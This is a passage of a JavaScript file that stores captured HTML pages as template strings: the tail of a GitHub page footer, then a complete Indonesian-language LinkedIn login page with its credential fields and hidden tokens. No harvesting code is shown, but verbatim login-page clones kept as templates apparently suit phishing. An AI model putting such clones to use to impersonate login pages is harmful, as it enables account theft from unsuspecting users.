          <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
        </li>

        <li class="mx-2">
          <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
        </li>

        <li class="mx-2">
          <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com" data-view-component="true" class="Link--secondary Link">Docs</a>
        </li>

        <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com" data-view-component="true" class="Link--secondary Link">Contact GitHub Support</a>
        </li>

          <li class="mx-2" >
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
    >
       Manage cookies
    </button>
  </cookie-consent-link>
</li>

<li class="mx-2">
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
    >
      Do not share my personal information
    </button>
  </cookie-consent-link>
</li>

    </ul>
  </div>


    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999"
      data-locale="en"
      data-initial-cookie-consent-allowed=""
      data-cookie-consent-required="false"
    ></ghcc-consent>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You can’t perform that action at this time.
  </div>

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>
    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
  </body>
</html>


  <microsoft-analytics>
  </microsoft-analytics>`;
const TEMPLATE_LOGIN_LINKEDIN = `<!DOCTYPE html>
    <html lang="id-ID" class="artdeco ">
      <head>
        
        <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="asset-url" id="artdeco/static/images/icons.svg" content="https://static.licdn.com/sc/h/6bja66gymvrvqrp5m6btz3vkz">
        <title>        
          Login LinkedIn, Login | LinkedIn  
        </title>
        <link rel="shortcut icon" href="https://static.licdn.com/sc/h/9lb1g1kp916tat669q9r5g2kz">
        <link rel="apple-touch-icon" href="https://static.licdn.com/sc/h/1exdo4axa6eaw1jioxh1vu4fj">
        <link rel="apple-touch-icon-precomposed" href="https://static.licdn.com/sc/h/55ggxxse8uyjdh2x78ht3j40q">
        <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://static.licdn.com/sc/h/1exdo4axa6eaw1jioxh1vu4fj">
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://static.licdn.com/sc/h/55ggxxse8uyjdh2x78ht3j40q">
        <meta name="treeID" content="AAY4YTA8k+b+ortHQvoVlw==">
        <meta name="pageKey" content="d_checkpoint_lg_consumerLogin">
        <meta name="pageInstance" content="urn:li:page:checkpoint_lg_login_default;3x7Kza0aSXWLxLqUx0Ug3Q==">
        <meta id="heartbeat_config" data-enable-page-view-heartbeat-tracking>
          <meta name="appName" content="checkpoint-frontend">
<!----><!---->
        
        <meta name="description" content="Login ke LinkedIn untuk menjalin relasi dengan orang yang Anda kenal, bertukar ide, dan membina karier Anda.">
        <meta name="robots" content="noarchive">
        <meta property="og:site_name" content="LinkedIn">
        <meta property="og:title" content="Login LinkedIn, Login | LinkedIn">
        <meta property="og:description" content="Login ke LinkedIn untuk menjalin relasi dengan orang yang Anda kenal, bertukar ide, dan membina karier Anda.">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://www.linkedin.com">
          <meta property="og:image" content="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
        <meta name="twitter:card" content="summary">
        <meta name="twitter:site" content="@linkedin">
        <meta name="twitter:title" content="Login LinkedIn, Login | LinkedIn">
        <meta name="twitter:description" content="Login ke LinkedIn untuk menjalin relasi dengan orang yang Anda kenal, bertukar ide, dan membina karier Anda.">
        
        
      
          <meta property="al:android:url" content="https://www.linkedin.com/login/id">
          <meta property="al:android:package" content="com.linkedin.android">
          <meta property="al:android:app_name" content="LinkedIn">
          <meta property="al:ios:app_store_id" content="288429040">
          <meta property="al:ios:app_name" content="LinkedIn">

          
        
        <link rel="stylesheet" href="https://static.licdn.com/sc/h/aqyadolt0wu7chazdqaa989fi">
      
        
        
          
    <link rel="canonical" href="https://www.linkedin.com/login/id">

    <link rel="alternate" hreflang="ar" href="https://www.linkedin.com/login/ar">
    <link rel="alternate" hreflang="cs" href="https://www.linkedin.com/login/cs">
    <link rel="alternate" hreflang="da" href="https://www.linkedin.com/login/da">
    <link rel="alternate" hreflang="de" href="https://www.linkedin.com/login/de">
    <link rel="alternate" hreflang="en" href="https://www.linkedin.com/login">
    <link rel="alternate" hreflang="es" href="https://www.linkedin.com/login/es">
    <link rel="alternate" hreflang="fr" href="https://www.linkedin.com/login/fr">
    <link rel="alternate" hreflang="hi" href="https://www.linkedin.com/login/hi">
    <link rel="alternate" hreflang="id" href="https://www.linkedin.com/login/id">
    <link rel="alternate" hreflang="it" href="https://www.linkedin.com/login/it">
    <link rel="alternate" hreflang="ja" href="https://www.linkedin.com/login/ja">
    <link rel="alternate" hreflang="ko" href="https://www.linkedin.com/login/ko">
    <link rel="alternate" hreflang="ms" href="https://www.linkedin.com/login/ms">
    <link rel="alternate" hreflang="nl" href="https://www.linkedin.com/login/nl">
    <link rel="alternate" hreflang="no" href="https://www.linkedin.com/login/no">
    <link rel="alternate" hreflang="pl" href="https://www.linkedin.com/login/pl">
    <link rel="alternate" hreflang="pt" href="https://www.linkedin.com/login/pt">
    <link rel="alternate" hreflang="ro" href="https://www.linkedin.com/login/ro">
    <link rel="alternate" hreflang="ru" href="https://www.linkedin.com/login/ru">
    <link rel="alternate" hreflang="sv" href="https://www.linkedin.com/login/sv">
    <link rel="alternate" hreflang="th" href="https://www.linkedin.com/login/th">
    <link rel="alternate" hreflang="tl" href="https://www.linkedin.com/login/tl">
    <link rel="alternate" hreflang="tr" href="https://www.linkedin.com/login/tr">
    <link rel="alternate" hreflang="zh" href="https://www.linkedin.com/login/zh">
    <link rel="alternate" hreflang="zh-cn" href="https://www.linkedin.com/login/zh">
    <link rel="alternate" hreflang="zh-tw" href="https://www.linkedin.com/login/zh-tw">
    <link rel="alternate" hreflang="x-default" href="https://www.linkedin.com/login">
  
        
      
        
          <link rel="preload" href="https://static.licdn.com/sc/h/ax9fa8qn7acaw8v5zs7uo0oba">
          <link rel="preload" href="https://static.licdn.com/sc/h/2nrnip1h2vmblu8dissh3ni93">
        <link rel="preload" href="https://static.licdn.com/sc/h/ce1b60o9xz87bra38gauijdx4">
        <link rel="preload" href="https://static.licdn.com/sc/h/zf50zdwg8datnmpgmdbkdc4r">
      
      
        <link rel="preload" href="https://static.licdn.com/sc/h/dj0ev57o38hav3gip4fdd172h">
        <link rel="preload" href="https://static.licdn.com/sc/h/3tcbd8fu71yh12nuw2hgnoxzf">
      
      </head>
      <body class="system-fonts ">
        
          

    
    <div id="app__container" class="glimmer">
      <header>
        
              
        
        
    

    <a class="linkedin-logo" href="/" aria-label="LinkedIn">
        

        <li-icon aria-label="LinkedIn" size="28dp" alt="LinkedIn" color="brand" type="linkedin-logo">
            <svg width="102" height="26" viewbox="0 0 102 26" fill="none" xmlns="http://www.w3.org/2000/svg" id="linkedin-logo" preserveaspectratio="xMinYMin meet" focusable="false">
                <path d="M13 10H17V22H13V10ZM15 3.8C14.5671 3.80984 14.1468 3.94718 13.7917 4.19483C13.4365 4.44247 13.1623 4.7894 13.0035 5.19217C12.8446 5.59493 12.8081 6.03562 12.8985 6.45903C12.989 6.88244 13.2024 7.26975 13.5119 7.57245C13.8215 7.87514 14.2135 8.07976 14.6389 8.16067C15.0642 8.24159 15.504 8.1952 15.903 8.02732C16.3021 7.85943 16.6428 7.57752 16.8824 7.2169C17.122 6.85627 17.2499 6.43297 17.25 6C17.2515 5.70645 17.1939 5.4156 17.0807 5.14474C16.9675 4.87388 16.801 4.62854 16.5911 4.42331C16.3812 4.21808 16.1322 4.05714 15.8589 3.95006C15.5855 3.84299 15.2934 3.79195 15 3.8ZM4 4H0V22H11V18H4V4ZM57.9 16.2C57.9 16.61 57.9 16.86 57.9 17H48.9C48.9021 17.169 48.9256 17.337 48.97 17.5C49.1765 18.0933 49.5745 18.6011 50.1014 18.9433C50.6282 19.2855 51.254 19.4427 51.88 19.39C52.4142 19.4129 52.9468 19.3171 53.4396 19.1096C53.9324 18.9021 54.3731 18.5881 54.73 18.19L57.45 19.87C56.7533 20.6812 55.88 21.322 54.8971 21.7433C53.9142 22.1645 52.8479 22.3549 51.78 22.3C48.19 22.3 45.12 20.25 45.12 16.11C45.091 15.2506 45.2411 14.3946 45.5608 13.5963C45.8804 12.798 46.3626 12.075 46.9767 11.4731C47.5908 10.8712 48.3234 10.4037 49.128 10.1001C49.9325 9.7966 50.7914 9.66374 51.65 9.71C55.08 9.71 57.9 12 57.9 16.2ZM54.15 14.69C54.16 14.3669 54.0997 14.0455 53.9731 13.748C53.8466 13.4506 53.6569 13.1842 53.4172 12.9673C53.1775 12.7504 52.8935 12.5883 52.5849 12.492C52.2763 12.3958 51.9505 12.3678 51.63 12.41C50.9638 12.3515 50.3013 12.558 49.7865 12.9849C49.2716 13.4118 48.9459 14.0245 48.88 14.69H54.15ZM68 4H72V22H68.61V20.57C68.1486 21.1444 67.5541 21.5977 66.878 21.8904C66.2019 22.1832 65.4646 22.3066 64.73 22.25C62.22 22.25 59.18 20.39 59.18 16C59.18 12.08 61.87 9.75 64.68 9.75C65.299 9.72159 65.9167 9.82856 66.4902 10.0634C67.0636 10.2983 67.5788 10.6555 68 11.11V4ZM68.3 16C68.3 14.12 67.13 12.87 65.64 12.87C65.2366 12.8697 64.8373 12.9508 64.466 13.1084C64.0946 13.266 63.7589 13.4969 63.4788 13.7872C63.1988 14.0775 62.9801 14.4214 62.836 14.7981C62.6919 15.1749 62.6252 15.5769 62.64 15.98C62.6279 16.3815 62.6966 16.7813 62.842 17.1557C62.9874 17.5301 63.2064 17.8716 63.4862 18.1597C63.766 18.4479 64.1008 18.677 64.4708 18.8333C64.8407 18.9897 65.2383 19.0702 65.64 19.07C66.0201 19.0542 66.393 18.9609 66.7357 18.7957C67.0785 18.6305 67.3838 18.3969 67.6329 18.1094C67.8821 17.8219 68.0698 17.4864 68.1845 17.1236C68.2992 16.7609 68.3385 16.3785 68.3 16ZM45.76 10H41L37.07 14.9H37V4H33V22H37V16.27H37.07L41.07 22H46L41 15.48L45.76 10ZM26.53 9.7C25.7825 9.68818 25.0441 9.8653 24.3833 10.2149C23.7226 10.5645 23.1607 11.0754 22.75 11.7H22.7V10H19V22H23V15.47C22.956 15.1525 22.9801 14.8292 23.0706 14.5216C23.1611 14.2141 23.316 13.9294 23.525 13.6863C23.7341 13.4432 23.9924 13.2474 24.2829 13.1118C24.5734 12.9763 24.8894 12.9041 25.21 12.9C26.31 12.9 27 13.49 27 15.42V22H31V14.56C31 10.91 28.71 9.7 26.53 9.7ZM102 2V24C102 24.5304 101.789 25.0391 101.414 25.4142C101.039 25.7893 100.53 26 100 26H78C77.4696 26 76.9609 25.7893 76.5858 25.4142C76.2107 25.0391 76 24.5304 76 24V2C76 1.46957 76.2107 0.960859 76.5858 0.585786C76.9609 0.210714 77.4696 0 78 0L100 0C100.53 0 101.039 0.210714 101.414 0.585786C101.789 0.960859 102 1.46957 102 2ZM84 10H80V22H84V10ZM84.25 6C84.2599 5.553 84.1365 5.11317 83.8954 4.73664C83.6542 4.36011 83.3064 4.06396 82.8962 3.88597C82.4861 3.70798 82.0322 3.65622 81.5925 3.73731C81.1528 3.8184 80.7472 4.02865 80.4275 4.34124C80.1079 4.65382 79.8885 5.05456 79.7976 5.49233C79.7066 5.9301 79.7482 6.38503 79.9169 6.79909C80.0856 7.21314 80.3739 7.56754 80.7449 7.81706C81.1159 8.06657 81.5529 8.19989 82 8.2C82.2934 8.20805 82.5855 8.15701 82.8588 8.04994C83.1322 7.94286 83.3812 7.78192 83.5911 7.57669C83.801 7.37146 83.9675 7.12612 84.0807 6.85526C84.1939 6.5844 84.2514 6.29355 84.25 6ZM98 14.56C98 10.91 95.71 9.66 93.53 9.66C92.7782 9.65542 92.0375 9.84096 91.3766 10.1994C90.7158 10.5578 90.1562 11.0774 89.75 11.71V10H86V22H90V15.47C89.956 15.1525 89.9801 14.8292 90.0706 14.5216C90.1611 14.2141 90.316 13.9294 90.525 13.6863C90.7341 13.4432 90.9924 13.2474 91.2829 13.1118C91.5734 12.9763 91.8894 12.9041 92.21 12.9C93.31 12.9 94 13.49 94 15.42V22H98V14.56Z" fill="#0A66C2"></path>
            </svg>
        </li-icon>

  
    </a>
  
      
      
            
      </header>

      <main class="app__content" role="main">
        
              
        
          
<!----><!---->  
          
    
    
    
    
    
    
    
    

    <form method="post" id="otp-generation" class="hidden__imp">
      
    <input name="csrfToken" value="ajax:7801759608768218721" type="hidden">  

      <input name="resendUrl" id="input-resend-otp-url" type="hidden">
      <input name="midToken" type="hidden">
      <input name="session_redirect" type="hidden">
      <input name="parentPageKey" value="d_checkpoint_lg_consumerLogin" type="hidden">
      <input name="pageInstance" value="urn:li:page:checkpoint_lg_login_default;3x7Kza0aSXWLxLqUx0Ug3Q==" type="hidden">
      <input name="controlId" value="d_checkpoint_lg_consumerLogin-SignInUsingOneTimeSignInLink" type="hidden">
      <input name="session_redirect" type="hidden">
      <input name="trk" type="hidden">
      <input name="authUUID" type="hidden">
      <input name="encrypted_session_key" type="hidden">
<!---->    </form>
    <code id="i18nOtpSuccessMessage" style="display: none"><!--"Kami telah mengirimkan link sekali pakai ke alamat email Anda. Tidak menemukannya? Periksa folder spam Anda."--></code>
    <code id="i18nOtpErrorMessage" style="display: none"><!--"Terjadi kesalahan. Coba lagi."--></code>
    <code id="i18nOtpRestrictedMessage" style="display: none"><!--"Untuk keamanan akun, sebaiknya hubungi kami agar Anda dapat login dengan kata sandi sekali pakai dari \u003ca href="/help/linkedin/ask/MPRRF\"\u003ePusat Bantuan LinkedIn.\u003c/a\u003e"--></code>
<!----><!---->  
        
    <div data-litms-pageview="true"></div>
  
        <div class="card-layout">
          <div id="organic-div">
            
    
    
    
    

    <div class="header__content ">
    <h1 class="header__content__heading ">
        Login
    </h1>
    <p class="header__content__subheading ">
<!---->          </p>
  </div>
  
              <div class="alternate-signin-container">
                
<!---->          
    
    

<!---->      <div class="alternate-signin__btn--google invisible__imp  margin-top-12"></div>
  
        
    
    
    
    

<!---->  
        
    <div class="microsoft-auth-button w-full">
<!---->      <div class="microsoft-auth-button__placeholder" data-text="signin_with"></div>
    </div>
  
        
    
    
    

<!---->  
        
    
    

    <button class="sign-in-with-apple-button hidden__imp" aria-label="Login dengan Apple" type="button">
      

        <svg width="24" height="24" viewbox="0 2 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="24" height="24" fill="transparent"></rect>
            <path d="M17.569 12.6254C17.597 15.652 20.2179 16.6592 20.247 16.672C20.2248 16.743 19.8282 18.1073 18.8662 19.5166C18.0345 20.735 17.1714 21.9488 15.8117 21.974C14.4756 21.9986 14.046 21.1799 12.5185 21.1799C10.9915 21.1799 10.5142 21.9489 9.2495 21.9987C7.93704 22.0485 6.93758 20.6812 6.09906 19.4673C4.38557 16.9842 3.0761 12.4508 4.83438 9.39061C5.70786 7.87092 7.26882 6.90859 8.96311 6.88391C10.2519 6.85927 11.4683 7.753 12.2562 7.753C13.0436 7.753 14.5219 6.67821 16.0759 6.83605C16.7265 6.8632 18.5527 7.09947 19.7253 8.81993C19.6309 8.87864 17.5463 10.095 17.569 12.6254ZM15.058 5.1933C15.7548 4.34789 16.2238 3.171 16.0959 2C15.0915 2.04046 13.877 2.67085 13.1566 3.5158C12.5109 4.26404 11.9455 5.46164 12.0981 6.60946C13.2176 6.69628 14.3612 6.03925 15.058 5.1933Z" fill="black"></path>
        </svg>
  
      <span class="sign-in-with-apple-button__text">
        Login dengan Apple
      </span>
    </button>
    <code id="appleSignInLibScriptPath" style="display: none"><!--"https://static.licdn.com/sc/h/1gpe377m8n1eq73qveizv5onv"--></code>
    <code id="i18nErrorAppleSignInGeneralErrorMessage" style="display: none"><!--"Terjadi kesalahan. Coba gunakan nama pengguna dan kata sandi."--></code>
    <code id="lix_checkpoint_auth_nexus_apple_flow" style="display: none"><!--true--></code>
  
        
    
    
    

<!---->  
<!----><!----><!---->
<!---->
<!---->      
    

    <a aria-label="Login dengan kunci sandi" class="alternate-signin__btn margin-top-12" role="button" id="sign-in-with-passkey-btn" style="display:none">
      <span class="btn-text">
          Login dengan kunci sandi
      </span>
    </a>
  
<!---->      
    <form class="microsoft-auth" action="/uas/login-submit" method="post" onlyshowonwindows>
      <input name="loginCsrfParam" value="e91fb616-884d-4835-80f4-e6a688f421ee" type="hidden">

<!---->
      <input name="trk" value="d_checkpoint_lg_consumerLogin_microsoft-auth-submit" type="hidden">
      
    <div class="loader loader--full-screen">
      <div class="loader__container mb-2 overflow-hidden">
        <icon class="loader__icon inline-block loader__icon--default text-color-progress-loading" data-delayed-url="https://static.licdn.com/sc/h/bzquwuxc79kqghdtn2kktfn5c" data-svg-class-name="loader__icon-svg--large fill-currentColor h-[60px] min-h-[60px] w-[60px] min-w-[60px]"></icon>
      </div>
    </div>
  
    </form>

    <script data-delayed-url="https://static.licdn.com/sc/h/7kewwbk0p2dthzs10jar2ce0z" data-module-id="microsoft-auth-lib"></script>
    <code id="isMicrosoftTermsAndConditionsSkipEnabled" style="display: none"><!--false--></code>
    <code id="microsoftAuthLibraryPath" style="display: none"><!--"https://static.licdn.com/sc/h/7kewwbk0p2dthzs10jar2ce0z"--></code>
    <code id="microsoftShowOneTap" style="display: none"><!--false--></code>
    <code id="microsoftLocale" style="display: none"><!--"in_ID"--></code>
  
<!---->      
    

    <div id="or-separator" class="or-separator margin-top-24 snapple-seperator hidden__imp">
      <span class="or-text">atau</span>
    </div>
  
    <code id="googleGSILibPath" style="display: none"><!--"https://static.licdn.com/sc/h/aofke6z5sqc44bjlvj6yr05c8"--></code>
    <code id="useGoogleGSILibraryTreatment" style="display: none"><!--"middle"--></code>
    <code id="usePasskeyLogin" style="display: none"><!--"support"--></code>

  
              </div>
            
    
    
    
    
    

    <form method="post" class="login__form" action="/checkpoint/lg/login-submit" novalidate>
        
    <input name="csrfToken" value="ajax:7801759608768218721" type="hidden">  
        
    
    
    
    
    
    
    
    
    
    
    
    
    

    <code id="login_form_validation_error_username" style="display: none"><!--"Masukkan nama pengguna yang valid."--></code>
    <code id="consumer_login__text_plain__large_username" style="display: none"><!--"Email atau nomor telepon harus terdiri dari 3 hingga 128 karakter."--></code>
      <code id="consumer_login__text_plain__no_username" style="display: none"><!--"Masukkan alamat email atau nomor telepon."--></code>

    <div class="form__input--floating margin-top-24 email-input-type">
<!---->        <input id="username" name="session_key" aria-describedby="error-for-username" required validation="email|tel" value autofocus autocomplete="username" placeholder=" " aria-label="Email atau telepon" type="email">
        <label class="form__label--floating" for="username" aria-hidden="true">
          Email atau telepon
        </label>
      <div error-for="username" id="error-for-username" class="form__label--error  hidden__imp" role="alert" aria-live="assertive">
<!---->      </div>
    </div>
    <code id="domainSuggestion" style="display: none"><!--false--></code>
  

<!---->        <input name="ac" value="0" type="hidden">
        <input name="loginFailureCount" value="0" type="hidden">
      <input name="sIdString" value="7c17a5ed-80db-4721-bc47-25b9fea9aa5e" type="hidden">
      
      <input id="pkSupported" name="pkSupported" value="false" type="hidden">

      <input name="parentPageKey" value="d_checkpoint_lg_consumerLogin" type="hidden">
      <input name="pageInstance" value="urn:li:page:checkpoint_lg_login_default;3x7Kza0aSXWLxLqUx0Ug3Q==" type="hidden">
      <input name="trk" type="hidden">
      <input name="authUUID" type="hidden">
      <input name="session_redirect" type="hidden">
      <input name="loginCsrfParam" value="e91fb616-884d-4835-80f4-e6a688f421ee" type="hidden">
      <input name="fp_data" value="default" id="fp_data_login" type="hidden">
      <input name="apfc" value="{}" id="apfc-login" type="hidden">

      <input name="_d" value="d" type="hidden">
<!----><!---->        <input name="showGoogleOneTapLogin" value="true" type="hidden">
        <input name="showAppleLogin" value="true" type="hidden">
        <input name="showMicrosoftLogin" value="true" type="hidden">
        <code id="i18nShow" style="display: none"><!--"Tampilkan"--></code>
        <code id="i18nHide" style="display: none"><!--"Sembunyikan"--></code>
          <input name="controlId" value="d_checkpoint_lg_consumerLogin-login_submit_button" type="hidden">
          
    
    
    
    
    
    

    <code id="consumer_login__text_plain__empty_password" style="display: none"><!--"Masukkan kata sandi."--></code>
    <code id="consumer_login__text_plain__small_password" style="display: none"><!--"Kata sandi yang Anda masukkan harus terdiri dari minimum 6 karakter."--></code>
    <code id="consumer_login__text_plain__large_password" style="display: none"><!--"Kata sandi yang Anda masukkan harus terdiri dari maksimum 400 karakter."--></code>
    <code id="consumer_login__text_plain__wrong_password" style="display: none"><!--"Kata sandi yang Anda masukkan salah. Silakan coba lagi"--></code>
    <code id="consumer_login__text_plain__large_password_200_chars" style="display: none"><!--"Kata sandi yang Anda masukkan harus terdiri dari maksimum 200 karakter."--></code>

    <div class="form__input--floating margin-top-24">
<!---->      <input id="password" aria-describedby="error-for-password" name="session_password" required validation="password" autocomplete="current-password" aria-label="Kata sandi" type="password">
        <label for="password" class="form__label--floating" aria-hidden="true">
            Kata sandi
        </label>
      <span id="password-visibility-toggle" class="button__password-visibility" role="button" tabindex="0">
        Tampilkan
      </span>
      <div error-for="password" id="error-for-password" class="form__label--error  hidden__imp" role="alert" aria-live="assertive">
<!---->      </div>
    </div>
  
          <a href="/checkpoint/rp/request-password-reset" id="reset-password-button" class="btn__tertiary--medium forgot-password" data-cie-control-urn="forgot-password-btn">
            Lupa kata sandi?
          </a>

          
    

    <div class="remember_me__opt_in">
      <input name="rememberMeOptIn" id="rememberMeOptIn-checkbox" class="large-input" checked value="true" type="checkbox">
      <label for="rememberMeOptIn-checkbox">Biarkan saya tetap login</label>
    </div>
  

<!---->
        <div class="login__form_action_container ">
<!---->          <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" aria-label="Login" type="submit">
              Login
          </button>
        </div>
      
    </form>
     <script src="https://static.licdn.com/sc/h/b4wm5m9prmznzyqy5g7fxos4u" defer></script>
     <code id="lix_checkpoint_reset_password_username_autofill" style="display: none"><!--true--></code>
  
<!---->          </div>
          <div id="otp-div" class="hidden__imp">
            
    
    
    
    
    
    
    
    
    
    
    
    
      <div class="otp-success-container">
        <h2 class="otp__header__content">
            Kami telah mengirimkan link sekali pakai ke alamat email utama Anda
        </h2>
        <p class="medium_text subheader__content">Klik link untuk login langsung ke akun LinkedIn Anda.</p>
        <div class="mailbox__logo" aria-hidden="true">
          

        <svg width="64" height="64" viewbox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
